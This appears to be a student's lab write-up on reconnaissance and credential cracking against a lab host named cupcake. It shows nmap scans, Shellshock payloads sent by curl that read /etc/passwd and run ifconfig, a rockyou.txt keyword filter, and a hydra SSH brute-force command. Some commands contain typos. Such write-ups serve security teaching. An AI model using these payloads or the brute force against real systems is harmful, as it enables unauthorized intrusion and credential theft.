# Week 4: Manual Vulnrability Detection

Were given a chance to actually crack credentials from a host on our network. The hostname is cupcake and its info isn't given to us through the assignment. We're tasked with gathering info through our `nmap` commands and use some new process to dig deeper into the hosts information.

Info given about the target :
* hostname: `cupcake`
* IP Address `10.0.5.23`
* Domain `cupcake.shire.org`

The one liner below provides port scanning and OS detection. 

`nmap -sV -A -sT 10.0.5.23`

The breakdown of this command and its flags:

* `-sV` : This flag enables version detection. Nmap attempts to detect the version of the services running on the open ports it finds. This can provide detailed information about what software and versions are running on the target machine.
* `-A` : This flag enables aggressive scanning. It combines multiple options to gather as much information as possible. Specifically, it does:

     * OS detection (detects the target's operating system).
     * Version detection (already covered by -sV).
     * Script scanning (runs default Nmap scripts against the target to detect vulnerabilities, misconfigurations, etc.).
     * Traceroute (finds the network path to the host).
* `-sT` : This flag initiates a TCP connect scan. Instead of using the default SYN scan (which is stealthier), it performs a full TCP connection (3-way handshake) to determine whether a port is open. This method is easier to detect by the target but is reliable because it completes the connection.

After this one liner were given alot of infomrmation from our target host:

|IP	|FQDN	|PORT	|PROTOCOL	|SERVICE	|VERSION|
| -- | -- | -- | -- | -- | -- |
|10.0.5.23|	 | 22	|tcp	|ssh	|OpenSSH 5.3 (protocol 2.0)|
|10.0.5.23|	 | 80	|tcp	|http	|Apache httpd 2.2.15 ((CentOS))|

Running: Linux 2.6.X|3.X

CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3 

### NmapToCSV Walkthrough

After taking our newwst `nmap` scanand outputting it into a text document using `>>` we are tasked to use nmaptocsv to format the data into a google sheets/csv fotmat.

`nmaptocsv -i nmapoutput.txt -d ","  `

This takes out output from the txt document anad prints an output that can be pasted into google sheets.

### Vulnerablity Detection

Using the flags wihthin nmap allow us to grab the kernel of a target.

`sudo nmap -O -sV 10.0.5.23`

The info that is found by running this command is:

OS PE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3 

OS details: Linux 2.632 - 3.10, Linux 2.6.32 - 3.13, Linux 3.4 - 3.10


Using `curl` to gather contents from the apache server is what were tasked to do next. Our main targets are **contents of /etc/passwd** + **code behind cgi** + **running ipconfig on remote computer**. 

To grab the contents of passwd the curl command is used with this formatting:
`curl -H 'UserAgent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' bash -s : '' https://10.0.5.23/cgi-bin/status >> passwrd.txt`

Our output is the stored in `passwrd.txt`, this document then can be used and parsed and `grepped`.

The code behind status cgi is found by runnig a similar curl command:

`curl -H 'UserAgent: () { :; }; echo ; echo ; /bin/cat /usr/bin/cgi-bin/status' bash -s : '' https://10.0.5.23/cgi-bin/status`

This will print out the html which shows the hostname of `10.0.5.23`.

Running `ifconfig` requires us to modify the curl statement once again:

`curl -H 'UserAgent: () { :; }; echo ; echo ; /sbin/ifconfig' https://10.0.5.23/cgi-bin/status`

This will output teh results of an `ifconfig` command on 10.0.5.23.

Using our preoiusly gathered password list we need to find potential passwords. We use a wordlist found wihtin our kali machines. We need to extract the contnents and use this list and our found keyword to filter through passwords. Were given a target number of 28 passwords so we know we have the right keyword.

Using `grep` we can compare the wordlist called "rockyou.txt" to "brutepass.txt"

`grep -i 'samwise' ~/rockyou.txt > brutepass.txt`

This will find the 28 passwords that include our keyword and move them to brutepass.txt

### Using Hydra

Hydra is a parallelized login cracker which supports numerous protocols to attack. It is very fast and flexible, and new modules are easy to add.

We are using `hydra` and its flags to crack `ssh` using out password list and username we identified earlier.

`hydra -l username -P ~/brutepass.txt 10.0.5.23 -t 4 ssh`

* The `-l` flag identifies the username which must be inputted
* The `-P` flag allows for a file with a password list to be cycked through in the attempts
* `ssh` determines the protocol to attack





